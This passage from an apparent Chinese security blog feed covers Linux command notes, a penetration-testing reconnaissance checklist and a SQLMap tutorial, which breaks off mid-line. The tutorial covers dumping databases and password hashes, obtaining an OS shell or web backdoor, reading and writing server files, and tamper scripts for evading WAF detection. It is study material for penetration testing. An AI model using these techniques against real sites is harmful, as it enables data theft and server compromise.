<h3 id="选项-19"><a href="#选项-19" class="headerlink" title="选项"></a>选项</h3><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="deletion">-b：在后台执行指令；</span></span><br><span class="line"><span class="deletion">-h：显示帮助；</span></span><br><span class="line"><span class="deletion">-H：将HOME环境变量设为新身份的HOME环境变量；</span></span><br><span class="line"><span class="deletion">-k：结束密码的有效期限，也就是下次再执行sudo时便需要输入密码；。</span></span><br><span class="line"><span class="deletion">-l：列出目前用户可执行与无法执行的指令；</span></span><br><span class="line"><span class="deletion">-p：改变询问密码的提示符号；</span></span><br><span class="line"><span class="deletion">-s&lt;shell&gt;：执行指定的shell；</span></span><br><span class="line"><span class="deletion">-u&lt;用户&gt;：以指定的用户作为新的身份。若不加上此参数，则预设以root作为新的身份；</span></span><br><span class="line"><span class="deletion">-v：延长密码有效期限5分钟；</span></span><br><span class="line"><span class="deletion">-V ：显示版本信息。</span></span><br></pre></td></tr></table></figure>
<h3 id="参数-14"><a href="#参数-14" class="headerlink" title="参数"></a>参数</h3><p>指令：需要运行的指令和对应的参数。</p>
<h2 id="useradd命令"><a href="#useradd命令" class="headerlink" title="useradd命令"></a>useradd命令</h2><p>useradd命令用于Linux中创建的新的系统用户。useradd可用来建立用户帐号。帐号建好之后，再用passwd设定帐号的密码．而可用userdel删除帐号。使用useradd指令所建立的帐号，实际上是保存在<code>/etc/passwd</code>文本文件中。</p>
<p>在Slackware中，adduser指令是个script程序，利用交谈的方式取得输入的用户帐号资料，然后再交由真正建立帐号的useradd命令建立新用户，如此可方便管理员建立用户帐号。在Red Hat Linux中，adduser命令则是useradd命令的符号连接，两者实际上是同一个指令。</p>
<h3 id="语法-21"><a href="#语法-21" class="headerlink" title="语法"></a>语法</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">useradd</span><span class="params">(选项)</span><span class="params">(参数)</span></span></span><br></pre></td></tr></table></figure>
<h3 id="选项-20"><a href="#选项-20" class="headerlink" title="选项"></a>选项</h3><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="deletion">-c&lt;备注&gt;：加上备注文字。备注文字会保存在passwd的备注栏位中；</span></span><br><span class="line"><span class="deletion">-d&lt;登入目录&gt;：指定用户登入时的启始目录；</span></span><br><span class="line"><span class="deletion">-D：变更预设值；</span></span><br><span class="line"><span class="deletion">-e&lt;有效期限&gt;：指定帐号的有效期限；</span></span><br><span class="line"><span class="deletion">-f&lt;缓冲天数&gt;：指定在密码过期后多少天即关闭该帐号；</span></span><br><span class="line"><span class="deletion">-g&lt;群组&gt;：指定用户所属的群组；</span></span><br><span class="line"><span class="deletion">-G&lt;群组&gt;：指定用户所属的附加群组；</span></span><br><span class="line"><span class="deletion">-m：自动建立用户的登入目录；</span></span><br><span class="line"><span class="deletion">-M：不要自动建立用户的登入目录；</span></span><br><span class="line"><span class="deletion">-n：取消建立以用户名称为名的群组；</span></span><br><span class="line"><span class="deletion">-r：建立系统帐号；</span></span><br><span class="line"><span class="deletion">-s&lt;shell&gt;：指定用户登入后所使用的shell；</span></span><br><span class="line"><span class="deletion">-u&lt;uid&gt;：指定用户id。</span></span><br></pre></td></tr></table></figure>
<h3 id="参数-15"><a href="#参数-15" class="headerlink" title="参数"></a>参数</h3><p>用户名：要创建的用户名。</p>
<h3 id="实例-18"><a href="#实例-18" class="headerlink" title="实例"></a>实例</h3><p>新建用户加入组：</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">useradd –g sales jack –G company,employees    <span class="comment">//-g：加入主要组、-G：加入次要组</span></span><br></pre></td></tr></table></figure>
<p>建立一个新用户账户，并设置ID：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">useradd caojh -u <span class="number">544</span></span><br></pre></td></tr></table></figure>
<p>需要说明的是，设定ID值时尽量要大于500，以免冲突。因为Linux安装后会建立一些特殊用户，一般0到499之间的值留给bin、mail这样的系统账号。</p>
<h2 id="mount命令"><a href="#mount命令" class="headerlink" title="mount命令"></a>mount命令</h2><p>mount命令用于加载文件系统到指定的加载点。此命令的最常用于挂载cdrom，使我们可以访问cdrom中的数据，因为你将光盘插入cdrom中，Linux并不会自动挂载，必须使用Linux mount命令来手动完成挂载。</p>
<h3 id="语法-22"><a href="#语法-22" class="headerlink" title="语法"></a>语法</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">mount</span><span class="params">(选项)</span><span class="params">(参数)</span></span></span><br></pre></td></tr></table></figure>
<h3 id="选项-21"><a href="#选项-21" class="headerlink" title="选项"></a>选项</h3><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="deletion">-V：显示程序版本；</span></span><br><span class="line"><span class="deletion">-l：显示已加载的文件系统列表；</span></span><br><span class="line"><span class="deletion">-h：显示帮助信息并退出；</span></span><br><span class="line"><span class="deletion">-v：冗长模式，输出指令执行的详细信息；</span></span><br><span class="line"><span class="deletion">-n：加载没有写入文件“/etc/mtab”中的文件系统；</span></span><br><span class="line"><span class="deletion">-r：将文件系统加载为只读模式；</span></span><br><span class="line"><span class="deletion">-a：加载文件“/etc/fstab”中描述的所有文件系统。</span></span><br></pre></td></tr></table></figure>
<h3 id="参数-16"><a href="#参数-16" class="headerlink" title="参数"></a>参数</h3><p>设备文件名：指定要加载的文件系统对应的设备名；<br>加载点：指定加载点目录。</p>
<h3 id="实例-19"><a href="#实例-19" class="headerlink" title="实例"></a>实例</h3><figure class="highlight tcl"><table><tr><td class="code"><pre><span class="line">mount -t auto /dev/cdrom /mnt/cdrom</span><br><span class="line">mount: mount point /mnt/cdrom does not exist           /mnt/cdrom目录不存在，需要先创建。</span><br><span class="line"></span><br><span class="line"><span class="keyword">cd</span> /mnt</span><br><span class="line">-bash: <span class="keyword">cd</span>: /mnt: No such <span class="keyword">file</span> or directory</span><br><span class="line"></span><br><span class="line">mkdir -p /mnt/cdrom    创建/mnt/cdrom目录</span><br><span class="line">ls</span><br><span class="line">bin   dev  home    lib         media  mnt  <span class="keyword">proc</span><span class="title">  sbin</span> <span class="title">    srv</span> <span class="title"> tmp</span> <span class="title"> var</span></span><br><span class="line"><span class="title">boot</span> <span class="title"> etc</span> <span class="title"> initrd</span> <span class="title"> lost+found</span> <span class="title"> misc</span> <span class="title">  opt</span> <span class="title"> root</span> <span class="title"> selinux</span> <span class="title"> sys</span> <span class="title"> usr</span></span><br><span class="line"><span class="title"></span></span><br><span class="line"><span class="title">mount</span> -t<span class="title"> auto</span> /dev/cdrom /mnt/cdrom     挂载cdrom</span><br><span class="line">mount:<span class="title"> block</span> device /dev/cdrom<span class="title"> is</span> write-protected,<span class="title"> mounting</span> read-only     挂载成功</span><br><span class="line"></span><br><span class="line">ll /mnt/cdrom    查看cdrom里面内容</span><br><span class="line">total 859</span><br><span class="line">dr-xr-xr-x  4<span class="title"> root</span> root   2048<span class="title"> Sep</span>  4  2005<span class="title"> CentOS</span></span><br><span class="line"><span class="title">-r--r--r--</span>  2<span class="title"> root</span> root   8859<span class="title"> Mar</span> 19  2005<span class="title"> centosdocs-man.css</span></span><br><span class="line"><span class="title">-r--r--r--</span>  9<span class="title"> root</span> root  18009<span class="title"> Mar</span>  1  2005<span class="title"> GPL</span></span><br><span class="line"><span class="title">dr-xr-xr-x</span>  2<span class="title"> root</span> root 241664<span class="title"> May</span>  7 02:32<span class="title"> headers</span></span><br><span class="line"><span class="title">dr-xr-xr-x</span>  4<span class="title"> root</span> root   2048<span class="title"> May</span>  7 02:23<span class="title"> images</span></span><br><span class="line"><span class="title">dr-xr-xr-x</span>  2<span class="title"> root</span> root   4096<span class="title"> May</span>  7 02:23<span class="title"> isolinux</span></span><br><span class="line"><span class="title">dr-xr-xr-x</span>  2<span class="title"> root</span> root  18432<span class="title"> May</span>  2 18:50<span class="title"> NOTES</span></span><br><span class="line"><span class="title">-r--r--r--</span>  2<span class="title"> root</span> root   5443<span class="title"> May</span>  7 01:49<span class="title"> RELEASE-NOTES-en.html</span></span><br><span class="line"><span class="title">dr-xr-xr-x</span>  2<span class="title"> root</span> root   2048<span class="title"> May</span>  7 02:34<span class="title"> repodata</span></span><br><span class="line"><span class="title">-r--r--r--</span>  9<span class="title"> root</span> root   1795<span class="title"> Mar</span>  1  2005<span class="title"> rpm-GPG-KEY</span></span><br><span class="line"><span class="title">-r--r--r--</span>  2<span class="title"> root</span> root   1795<span class="title"> Mar</span>  1  2005<span class="title"> RPM-GPG-KEY-centos4</span></span><br><span class="line"><span class="title">-r--r--r--</span>  1<span class="title"> root</span> root 571730<span class="title"> May</span>  7 01:39<span class="title"> yumgroups.xml</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p><a href="https://man.linuxde.net/" target="_blank" rel="noopener">https://man.linuxde.net/</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Linux常用命令</tag>
      </tags>
  </entry>
  <entry>
    <title>信息收集</title>
    <url>/posts/312e3d12.html</url>
    <content><![CDATA[<p>在渗透测试中我们常常是上来就开始搞事情不愿意去对目标的网站或服务做过多的信息收集，这有时会导致我们在特定的时间找不到相应的突破点，而这里就体现到了我们信息收集的意义与重要性，在我自己看来我们久攻不下的网站并不是我们能丽不够而是我们信息收集的不够，所以信息收集在我看来是整个渗透测试中最重要的一步也是非常有必要去做的一步</p>
<a id="more"></a>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">Whois信息</span><br><span class="line">	域名信息</span><br><span class="line">	备案信息</span><br><span class="line">	注册商</span><br><span class="line">	DNS信息</span><br><span class="line">	旁站信息</span><br><span class="line">	真实IP     <span class="comment">//通过多地ping查看</span></span><br><span class="line">	whois反查</span><br><span class="line">		邮箱反查域名</span><br><span class="line">		联系人反查域名</span><br><span class="line">	注册人信息</span><br><span class="line">		邮箱</span><br><span class="line">		电话</span><br><span class="line">		购买时间</span><br><span class="line">	在线Whois查询网站</span><br><span class="line">		爱站工具网 	<span class="string">https:</span><span class="comment">//whois.aizhan.com/</span></span><br><span class="line">		站长之家   	<span class="string">http:</span><span class="comment">//whois.chinaz.com/</span></span><br><span class="line">		微步       	<span class="string">https:</span><span class="comment">//x.threatbook.cn/</span></span><br><span class="line">		国外的		<span class="string">https:</span><span class="comment">//who.is/</span></span><br><span class="line">指纹信息</span><br><span class="line">	操作系统			Linux<span class="regexp">/Windows	/</span>/可通过url大小写判断</span><br><span class="line">	中间价			Apache<span class="regexp">/Nginx/</span>IIS等</span><br><span class="line">	数据库			Mysql<span class="regexp">/Mssql/</span>Access等</span><br><span class="line">	编程语言			PHP<span class="regexp">/ASP/</span>ASPX/JSP等</span><br><span class="line">	前端框架			jQuery<span class="regexp">/BootStrap/</span>Vue/React等</span><br><span class="line">	Web容器服务器	Tomcat<span class="regexp">/Jboss/</span>Weblogic等</span><br><span class="line">	后端框架			CMS</span><br><span class="line">	在线指纹识别网站</span><br><span class="line">		云悉			<span class="string">http:</span><span class="comment">//www.yunsee.cn/</span></span><br><span class="line">		bugscaner 	<span class="string">http:</span><span class="comment">//whatweb.bugscaner.com/</span></span><br><span class="line">		WhatWeb		<span class="string">https:</span><span class="comment">//whatweb.net/</span></span><br><span class="line">	本地工具</span><br><span class="line">		whatweb</span><br><span class="line">敏感信息</span><br><span class="line">	敏感目录</span><br><span class="line">	敏感文件</span><br><span class="line">		robots.txt</span><br><span class="line">		crossdomain.xml</span><br><span class="line">		sitemap.xml</span><br><span class="line">		xx.tar.gz</span><br><span class="line">		xx.bak</span><br><span class="line">		等</span><br><span class="line">	本地工具</span><br><span class="line">		dirsearch.py</span><br><span class="line">		御剑</span><br><span class="line">		DirBuster</span><br><span class="line">		wwwsacn</span><br><span class="line">		Spinder.py(轻量级快速单文件目录后台扫描)</span><br><span class="line">		Sensitivefilescan(轻量级快速单文件目录后台扫描）</span><br><span class="line">		Weakfilescan(轻量级快速单文件目录后台扫描)</span><br><span class="line">	搜索引擎</span><br><span class="line">		site----指定域名</span><br><span class="line">		inurl----URL中存在关键字的网页</span><br><span class="line">		intext----网页正文中关键字</span><br><span class="line">		intitle----搜索到的网页标题包含关键字</span><br><span class="line">		info----查找指定站点的一些基本信息</span><br><span class="line"></span><br><span class="line">C段信息</span><br><span class="line">子域名信息</span><br><span class="line">	使用工具</span><br><span class="line">端口信息</span><br><span class="line">	使用工具</span><br><span class="line">		Nmap</span><br><span class="line">WEF信息</span><br><span class="line">	使用工具</span><br><span class="line">		wafw00f</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>SQLMap</title>
    <url>/posts/bbc8ef4d.html</url>
    <content><![CDATA[<h1 id="SQlmap详解"><a href="#SQlmap详解" class="headerlink" title="SQlmap详解"></a>SQlmap详解</h1><h2 id="SQLMap概论"><a href="#SQLMap概论" class="headerlink" title="SQLMap概论"></a>SQLMap概论</h2><h3 id="5种SQL注入技术"><a href="#5种SQL注入技术" class="headerlink" title="5种SQL注入技术"></a>5种SQL注入技术</h3><p>布尔类型的盲注：返回页面判断条件真假的注入<br>基于时间的盲注：即不根据页面返回的内容判断任何信息，要用条件语句查看时间延迟语句是否执行（页面返回时间是否增加）来判断<br>基于报错注入：页面会返回错误信息，或者把注入语句的结果直接返回页面种<br>联合查询注入：在使用Union的情况下的注入<br>堆查询注入：同时执行多条语句时的注入</p>
<a id="more"></a>
<h3 id="支持的数据库种类"><a href="#支持的数据库种类" class="headerlink" title="支持的数据库种类"></a>支持的数据库种类</h3><p>MySQL<br>Oracle<br>PostgreSQL<br>MSSQLSever<br>Microsoft Access<br>IBM DB2<br>SQLite<br>Firebird<br>Sybase<br>SAP MaxDB</p>
<h3 id="SQLMap的强大功能"><a href="#SQLMap的强大功能" class="headerlink" title="SQLMap的强大功能"></a>SQLMap的强大功能</h3><p>数据库指纹识别<br>数据库枚举<br>数据库提取<br>访问目标文件系统，并在获取完全的操作权限时实行任意命令</p>
<h2 id="SQLMap入门："><a href="#SQLMap入门：" class="headerlink" title="SQLMap入门："></a>SQLMap入门：</h2><figure class="highlight haml"><table><tr><td class="code"><pre><span class="line">判断是否存在注入</span><br><span class="line">	-<span class="ruby">u <span class="string">"URL"</span></span></span><br><span class="line"><span class="ruby">判断文本中的请求是否存在注入</span></span><br><span class="line"><span class="ruby">	-r</span></span><br><span class="line"><span class="ruby">查询当前用户下所有数据库</span></span><br><span class="line"><span class="ruby">	--dbs </span></span><br><span class="line"><span class="ruby">查询当前用户下所有数据库</span></span><br><span class="line"><span class="ruby">	-D pram   指定某一个具体的数据库</span></span><br><span class="line"><span class="ruby">获取数据库的表名</span></span><br><span class="line"><span class="ruby">	--tables	某表名继续查询</span></span><br><span class="line"><span class="ruby">获取表中的字段</span></span><br><span class="line"><span class="ruby">	--columns</span></span><br><span class="line"><span class="ruby">获取字段内容</span></span><br><span class="line"><span class="ruby">	--dump	查询完字段名后，获取字段中具体数据信息</span></span><br><span class="line"><span class="ruby">获取数据库的所有用户</span></span><br><span class="line"><span class="ruby">	--users	列出所有管理员用户</span></span><br><span class="line"><span class="ruby">获取数据库用户的密码</span></span><br><span class="line"><span class="ruby">	--passwords	列出数据库用户的密码</span></span><br><span class="line"><span class="ruby">获取当前网站数据库名称</span></span><br><span class="line"><span class="ruby">	--current-db</span></span><br><span class="line"><span class="ruby">获取当前网站数据库的用户名称</span></span><br><span class="line"><span class="ruby">	--current-user</span></span><br></pre></td></tr></table></figure>
<h2 id="SQLMap进阶：参数讲解"><a href="#SQLMap进阶：参数讲解" class="headerlink" title="SQLMap进阶：参数讲解"></a>SQLMap进阶：参数讲解</h2><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="comment">--leve 5：探测等级</span></span><br><span class="line">	等级越高速度越慢，Payload也越多</span><br><span class="line">	参数会影响测试的注入点</span><br><span class="line">		所有参数都会测试<span class="keyword">GET</span>和POST</span><br><span class="line">		leve2 开始测试HTTP cookie</span><br><span class="line">		leve3开始测试HTTP <span class="keyword">User</span>-Agent/Referer头</span><br><span class="line">		为了保证全面性建议用高<span class="keyword">level</span></span><br><span class="line"><span class="comment">--is-dba：当前用户是否为管理权限</span></span><br><span class="line"><span class="comment">--role：列出数据库管理员角色</span></span><br><span class="line">	只针对Oracle数据库</span><br><span class="line">		-U指定想看哪个用户的角色</span><br><span class="line"><span class="comment">--referer：HTTP Referer头</span></span><br><span class="line">	SQLMap可伪造HTTP中的referer，<span class="comment">--level为3或3以上时候会尝试对referer注入。可使用referer命令进行欺骗</span></span><br><span class="line"><span class="comment">--sql-shell:运行自定义SQL语句</span></span><br><span class="line">	用于执行指定的<span class="keyword">SQL</span>语句</span><br><span class="line"><span class="comment">--os-cmd，--os-shell：运行任意操作系统命令</span></span><br><span class="line">	<span class="comment">--os-shell：模拟一个真实的shell，输入想执行的命令。当不能执行多语句时（如PHP或ASP的后端数据库为MySQL），仍然可以使用INTO OUTFILE写进可写目录，创建一个Web后门</span></span><br><span class="line">		想执行改参数，需要有数据库管理员权限<span class="comment">--is-dba为True</span></span><br><span class="line"><span class="comment">--file-read：从数据库服务器中读取文件</span></span><br><span class="line">	用于读取执行文件，当数据库为MySQL，PostgreSQL或MSSQL Sever并当前用户权限使用特定的函数时，读取的文件可以是文本，也可以是二进制文件。</span><br><span class="line">		sqlmap.py -u "URL"   <span class="comment">--file-read "C:/example.exe" -v 1 </span></span><br><span class="line"><span class="comment">--file-write --file-dest:上传文件到数据库服务器中</span></span><br><span class="line">	该命令用于写入本地文件到服务器中，当数据库为MySQL，PostgreSQL或MSSQL Sever并当前用户权限使用特定的函数时，上传的文件可以是文本，也可以是二进制文件。</span><br></pre></td></tr></table></figure>
<h2 id="SQLMAP自带脚本绕过脚本tamper的讲解"><a href="#SQLMAP自带脚本绕过脚本tamper的讲解" class="headerlink" title="SQLMAP自带脚本绕过脚本tamper的讲解"></a>SQLMAP自带脚本绕过脚本tamper的讲解</h2><p>默认情况下使用CHAR()函数防止出现单引号，没有对注入的数据进行修改<br>###–tamper参数对数据做修改来绕过WAF等设备<br>大部分脚本主要是用正则模块替换攻击在和字符编码的方式尝试绕过WAF检测规则<br>–tamper  “模块名”<br>–identify-waf:检测网站是否有安全防护(WAF/IDS/IPS)<br>tamper脚本</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">apostrophemask.<span class="keyword">py</span></span><br><span class="line">	将引号替换成UTF-<span class="number">8</span>，用于过滤单引号</span><br><span class="line">base64encode.<span class="keyword">py</span></span><br><span class="line">	替换为base64编码</span><br><span class="line">multiplespaces.<span class="keyword">py</span></span><br><span class="line">	围绕SQL关键字添加多个空格</span><br><span class="line">sqpce2plus.<span class="keyword">py</span></span><br><span class="line">	用+代替空格</span><br><span class="line">nonrecursivereplacement.<span class="keyword">py</span></span><br><span class="line">	作为双重查询语句，用双重语句替代定义的SQL关键字（适用于非常弱的自定义过滤器，例如将SELECT替换为空）。（selselectect）</span><br><span class="line">space2randomblank.<span class="keyword">py</span></span><br><span class="line">	将空格替换为其他有效字符</span><br><span class="line">unionalltounion.<span class="keyword">py</span></span><br><span class="line">	将union <span class="keyword">all</span> select 替换成union select</span><br><span class="line">securesphere.<span class="keyword">py</span></span><br><span class="line">	追加特制的字符串</span><br><span class="line">spce2hash.<span class="keyword">py</span></span><br><span class="line">	将空格替换为#号，并添加一个随机字符串和换行符。</span><br><span class="line">space2mssqlbank.<span class="keyword">py</span>(mssql)</span><br><span class="line">	将空格替换为其他符号</span><br><span class="line">space2mssqlhash.<span class="keyword">py</span></span><br><span class="line">	将空格替换为#，并添加一个换行符</span><br><span class="line">between.<span class="keyword">py</span></span><br><span class="line">	用not between <span class="number">0</span> <span class="built_in">and</span>   替换大于号（&gt;）,用between <span class="built_in">and</span> 替换等号（=）</span><br><span class="line">percentage.<span class="keyword">py</span></span><br><span class="line">	ASP允许在每个字符前面添加一个%号</span><br><span class="line">sp_password.<span class="keyword">py</span></span><br><span class="line">	从DBMS日志的自动模糊处理的有效载荷中追加sp_password</span><br><span class="line">charencode.<span class="keyword">py</span></span><br><span class="line">	对给定的Payload全部字符使用URL编码（不处理已编码的字符）</span><br><span class="line">randomcase.<span class="keyword">py</span></span><br><span class="line">	随机大小写</span><br><span class="line">charunicodeencode.<span class="keyword">py</span></span><br><span class="line">	字符串unicode编码</span><br><span class="line">space2comment.<span class="keyword">py</span></span><br><span class="line">	将空格替换为/**/</span><br><span class="line">equaltolike.<span class="keyword">py</span></span><br><span class="line">	将等号替换为like</span><br><span class="line">greatest.<span class="keyword">py</span></span><br><span class="line">	绕过对“&gt;”的过滤，用greatest替换大于号</span><br><span class="line">ifnull2ifisnull.<span class="keyword">py</span></span><br><span class="line">	绕过对ifull的过滤，替换类似ifnull(A,B)为IF(ISNULL(A),B,A)</span><br><span class="line">modsecurityversioned.<span class="keyword">py</span></span><br><span class="line">	过滤空格，使用MySQL内联注释的方式进行注入</span><br><span class="line">space2mysqlblank.<span class="keyword">py</span></span><br><span class="line">	将空格替换为其他空白符号（适用于MySQL）</span><br><span class="line">modsecurityzeroversioned.<span class="keyword">py</span></span><br><span class="line">	使用MySQL内联注释的方式（/*！<span class="number">0000</span>*/）进行注入</span><br><span class="line">space2mysqldash.<span class="keyword">py</span></span><br><span class="line">	将空格替换为--，并添加一个换行符</span><br><span class="line">bluecoat.<span class="keyword">py</span></span><br><span class="line">	在SQL语句之后用有效的随机空白符替换空格符，随后用like替换等于号</span><br><span class="line">versionedkeywords.<span class="keyword">py</span></span><br><span class="line">	注释绕过</span><br><span class="line">halfversionedmorekeywords.<span class="keyword">py</span></span><br><span class="line">	当数据库为MySQL时绕过防火墙，在每个关键字之前添加MySQL版本注释</span><br><span class="line">space2morehash.<span class="keyword">py</span></span><br><span class="line">	将空格替换为#号，并添加一个随机字符串和换行符</span><br><span class="line">apostrophenullencode.<span class="keyword">py</span></span><br><span class="line">	用非法双字节unicode字符替换单引号</span><br><span class="line">appendnullbyte.<span class="keyword">py</span></span><br><span class="line">	在有效负荷的结束位置加载零字节字符编码</span><br><span class="line">chardoubleencode.<span class="keyword">py</span></span><br><span class="line">	对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）</span><br><span class="line">unmagicquotes.<span class="keyword">py</span></span><br><span class="line">	用于一个多字节组合（%<span class="keyword">bf</span>%<span class="number">27</span>）和末尾通用注释一起替换空格</span><br><span class="line">randomcomments.<span class="keyword">py</span></span><br><span class="line">	用/**/分割SQL关键字</span><br></pre></td></tr></table></figure>
<pre><code>建议：在学习使用自带的tamper的同时，最好掌握tamper的编写规则</code></pre><h2 id="sqlmap中文用法指南"><a href="#sqlmap中文用法指南" class="headerlink" title="sqlmap中文用法指南"></a>sqlmap中文用法指南</h2><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">用法：python sqlmap.py [选项]</span><br><span class="line"></span><br><span class="line">选项：</span><br><span class="line">  -h, <span class="comment">--help            显示基本帮助信息并退出</span></span><br><span class="line">  -hh                   显示高级帮助信息并退出</span><br><span class="line">  <span class="comment">--version             显示程序版本信息并退出</span></span><br><span class="line">  -v <span class="keyword">VERBOSE</span>            输出信息详细程度级别：<span class="number">0</span><span class="number">-6</span>（默认为 <span class="number">1</span>）</span><br><span class="line"></span><br><span class="line">  目标：</span><br><span class="line">      至少提供一个以下选项以指定目标</span><br><span class="line"></span><br><span class="line">    -d DIRECT           直接连接数据库</span><br><span class="line">    -u URL, <span class="comment">--url=URL   目标 URL（例如："http://www.site.com/vuln.php?id=1"）</span></span><br><span class="line">    -l LOGFILE          从 Burp 或 WebScarab 代理的日志文件中解析目标地址</span><br><span class="line">    -x SITEMAPURL       从远程网站地图（.xml）文件中解析目标</span><br><span class="line">    -m BULKFILE         从文本文件中获取批量目标</span><br><span class="line">    -r REQUESTFILE      从文件中读取 HTTP 请求</span><br><span class="line">    -g GOOGLEDORK       使用 Google dork 结果作为目标</span><br><span class="line">    -c CONFIGFILE       从 INI 配置文件中加载选项</span><br><span class="line"></span><br><span class="line">  请求：</span><br><span class="line">      以下选项可以指定连接目标地址的方式</span><br><span class="line"></span><br><span class="line">    <span class="comment">--method=METHOD     强制使用提供的 HTTP 方法（例如：PUT）</span></span><br><span class="line">    <span class="comment">--data=DATA         使用 POST 发送数据串</span></span><br><span class="line">    <span class="comment">--param-del=PARA..  设置参数值分隔符</span></span><br><span class="line">    <span class="comment">--cookie=COOKIE     指定 HTTP Cookie </span></span><br><span class="line">    <span class="comment">--cookie-del=COO..  设置 cookie 分隔符</span></span><br><span class="line">    <span class="comment">--load-cookies=L..  指定以 Netscape/wget 格式存放 cookies 的文件</span></span><br><span class="line">    <span class="comment">--drop-set-cookie   忽略 HTTP 响应中的 Set-Cookie 参数</span></span><br><span class="line">    <span class="comment">--user-agent=AGENT  指定 HTTP User-Agent</span></span><br><span class="line">    <span class="comment">--random-agent      使用随机的 HTTP User-Agent</span></span><br><span class="line">    <span class="comment">--host=HOST         指定 HTTP Host</span></span><br><span class="line">    <span class="comment">--referer=REFERER   指定 HTTP Referer</span></span><br><span class="line">    -H <span class="keyword">HEADER</span>, <span class="comment">--hea..  设置额外的 HTTP 头参数（例如："X-Forwarded-For: 127.0.0.1"）</span></span><br><span class="line">    <span class="comment">--headers=HEADERS   设置额外的 HTTP 头参数（例如："Accept-Language: fr\nETag: 123"）</span></span><br><span class="line">    <span class="comment">--auth-type=AUTH..  HTTP 认证方式（Basic，Digest，NTLM 或 PKI）</span></span><br><span class="line">    <span class="comment">--auth-cred=AUTH..  HTTP 认证凭证（username:password）</span></span><br><span class="line">    <span class="comment">--auth-file=AUTH..  HTTP 认证 PEM 证书/私钥文件</span></span><br><span class="line">    <span class="comment">--ignore-code=IG..  忽略 HTTP 错误码（例如：401）</span></span><br><span class="line">    <span class="comment">--ignore-proxy      忽略系统默认代理设置</span></span><br><span class="line">    <span class="comment">--ignore-redirects  忽略重定向尝试</span></span><br><span class="line">    <span class="comment">--ignore-timeouts   忽略连接超时</span></span><br><span class="line">    <span class="comment">--proxy=PROXY       使用代理连接目标 URL</span></span><br><span class="line">    <span class="comment">--proxy-cred=PRO..  使用代理进行认证（username:password）</span></span><br><span class="line">    <span class="comment">--proxy-file=PRO..  从文件中加载代理列表</span></span><br><span class="line">    <span class="comment">--tor               使用 Tor 匿名网络</span></span><br><span class="line">    <span class="comment">--tor-port=TORPORT  设置 Tor 代理端口代替默认端口</span></span><br><span class="line">    <span class="comment">--tor-type=TORTYPE  设置 Tor 代理方式（HTTP，SOCKS4 或 SOCKS5（默认））</span></span><br><span class="line">    <span class="comment">--check-tor         检查是否正确使用了 Tor</span></span><br><span class="line">    <span class="comment">--delay=DELAY       设置每个 HTTP 请求的延迟秒数</span></span><br><span class="line">    <span class="comment">--timeout=TIMEOUT   设置连接响应的有效秒数（默认为 30）</span></span><br><span class="line">    <span class="comment">--retries=RETRIES   连接超时时重试次数（默认为 3）</span></span><br><span class="line">    <span class="comment">--randomize=RPARAM  随机更改给定的参数值</span></span><br><span class="line">    <span class="comment">--safe-url=SAFEURL  测试过程中可频繁访问且合法的 URL 地址（译者注：</span></span><br><span class="line">                        有些网站在你连续多次访问错误地址时会关闭会话连接，</span><br><span class="line">                        后面的“请求”小节有详细说明）</span><br><span class="line">    <span class="comment">--safe-post=SAFE..  使用 POST 方法发送合法的数据</span></span><br><span class="line">    <span class="comment">--safe-req=SAFER..  从文件中加载合法的 HTTP 请求</span></span><br><span class="line">    <span class="comment">--safe-freq=SAFE..  每访问两次给定的合法 URL 才发送一次测试请求</span></span><br><span class="line">    <span class="comment">--skip-urlencode    不对 payload 数据进行 URL 编码</span></span><br><span class="line">    <span class="comment">--csrf-token=CSR..  设置网站用来反 CSRF 攻击的 token</span></span><br><span class="line">    <span class="comment">--csrf-url=CSRFURL  指定可提取反 CSRF 攻击 token 的 URL</span></span><br><span class="line">    <span class="comment">--force-ssl         强制使用 SSL/HTTPS</span></span><br><span class="line">    <span class="comment">--hpp               使用 HTTP 参数污染攻击</span></span><br><span class="line">    <span class="comment">--eval=EVALCODE     在发起请求前执行给定的 Python 代码（例如：</span></span><br><span class="line">                        "import hashlib;id2=hashlib.md5(id).hexdigest()"）</span><br><span class="line"></span><br><span class="line">  优化：</span><br><span class="line">    以下选项用于优化 sqlmap 性能</span><br><span class="line"></span><br><span class="line">    -o                  开启所有优化开关</span><br><span class="line">    <span class="comment">--predict-output    预测常用请求的输出</span></span><br><span class="line">    <span class="comment">--keep-alive        使用持久的 HTTP(S) 连接</span></span><br><span class="line">    <span class="comment">--null-connection   仅获取页面大小而非实际的 HTTP 响应</span></span><br><span class="line">    <span class="comment">--threads=THREADS   设置 HTTP(S) 请求并发数最大值（默认为 1）</span></span><br><span class="line"></span><br><span class="line">  注入：</span><br><span class="line">    以下选项用于指定要测试的参数，</span><br><span class="line">    提供自定义注入 payloads 和篡改参数的脚本</span><br><span class="line"></span><br><span class="line">    -p TESTPARAMETER    指定需要测试的参数</span><br><span class="line">    <span class="comment">--skip=SKIP         指定要跳过的参数</span></span><br><span class="line">    <span class="comment">--skip-static       指定跳过非动态参数</span></span><br><span class="line">    <span class="comment">--param-exclude=..  用正则表达式排除参数（例如："ses"）</span></span><br><span class="line">    <span class="comment">--dbms=DBMS         指定 DBMS 类型（例如：MySQL）</span></span><br><span class="line">    <span class="comment">--dbms-cred=DBMS..  DBMS 认证凭据（username:password）</span></span><br><span class="line">    <span class="comment">--os=OS             指定 DBMS 服务器的操作系统类型</span></span><br><span class="line">    <span class="comment">--invalid-bignum    将无效值设置为大数</span></span><br><span class="line">    <span class="comment">--invalid-logical   对无效值使用逻辑运算</span></span><br><span class="line">    <span class="comment">--invalid-string    